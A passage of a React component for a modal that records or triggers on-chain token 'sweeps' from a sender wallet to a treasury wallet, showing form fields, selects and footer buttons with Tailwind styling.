                  onChange={(e) => setManualSender(e.target.value)}
                  placeholder="0x..."
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-mono bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              <div className="col-span-2">
                <label className="text-xs font-bold text-gray-700 block mb-1">Recipient Wallet (Treasury)</label>
                <input
                  type="text"
                  value={manualRecipient}
                  onChange={(e) => setManualRecipient(e.target.value)}
                  placeholder="0x..."
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-mono bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">Token</label>
                <select
                  value={manualToken}
                  onChange={(e) => setManualToken(e.target.value)}
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-bold text-teal-700 bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                >
                  <option value="USDT">USDT</option>
                  <option value="USDC">USDC</option>
                  <option value="ETH">ETH</option>
                </select>
              </div>

              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">Sweep Amount</label>
                <input
                  type="text"
                  value={manualAmount}
                  onChange={(e) => setManualAmount(e.target.value)}
                  placeholder="e.g. 5,000"
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-bold text-gray-800 bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">Network Chain</label>
                <select
                  value={manualChain}
                  onChange={(e) => setManualChain(e.target.value as any)}
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-semibold bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                >
                  <option value="Ethereum Mainnet">Ethereum Mainnet</option>
                  <option value="Sepolia">Sepolia Testnet</option>
                </select>
              </div>

              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">Confirmation Status</label>
                <select
                  value={manualStatus}
                  onChange={(e) => setManualStatus(e.target.value as any)}
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-semibold bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                >
                  <option value="confirmed">Confirmed</option>
                  <option value="pending">Pending</option>
                  <option value="failed">Failed</option>
                </select>
              </div>

              <div className="col-span-2">
                <label className="text-xs font-bold text-gray-700 block mb-1">Transaction Hash</label>
                <input
                  type="text"
                  value={manualTxHash}
                  onChange={(e) => setManualTxHash(e.target.value)}
                  placeholder="0x..."
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-mono bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">Block Confirmations</label>
                <input
                  type="number"
                  value={manualConfirmations}
                  onChange={(e) => setManualConfirmations(e.target.value)}
                  placeholder="12"
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-semibold bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>
            </div>
          </div>
        )}

        {/* Footer */}
        <div className="bg-gray-50 border-t border-gray-100 px-6 py-3.5 flex items-center justify-between">
          <div className="text-[11px] text-gray-500">
            {activeTab === 'live' ? (
              <span className="flex items-center gap-1 text-teal-700 font-medium">
                <ShieldCheck className="w-3.5 h-3.5" />
                {executionMethod === 'server' ? 'Direct 1-Click Server Collection' : 'Browser Web3 Collection'}
              </span>
            ) : (
              'Manual entry will be saved directly to Firestore'
            )}
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={onClose}
              className="px-3.5 py-2 text-xs font-semibold text-gray-600 hover:text-gray-800 transition-colors"
            >
              Cancel
            </button>

            {activeTab === 'live' ? (
              <button
                onClick={handleExecuteLiveSweep}
                disabled={isExecuting}
                className="inline-flex items-center gap-1.5 px-5 py-2 text-xs font-bold rounded-xl bg-teal-600 hover:bg-teal-500 disabled:opacity-50 text-white shadow-md transition-all hover:shadow-teal-500/20"
              >
                {isExecuting ? (
                  <>
                    <RotateCw className="w-3.5 h-3.5 animate-spin" />
                    Executing Sweep...
                  </>
                ) : (
                  <>
                    <Sparkles className="w-3.5 h-3.5 text-amber-300" />
                    ⚡ Execute On-Chain Sweep
                  </>
                )}
              </button>
            ) : (
              <button
                onClick={handleSaveManualRecord}
                disabled={manualSaving}
                className="inline-flex items-center gap-1.5 px-4 py-2 text-xs font-bold rounded-xl bg-teal-600 hover:bg-teal-500 disabled:opacity-50 text-white shadow transition-all"
              >
                <Check className="w-3.5 h-3.5" />
                {manualSaving ? 'Saving...' : 'Save Record Entry'}
              </button>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
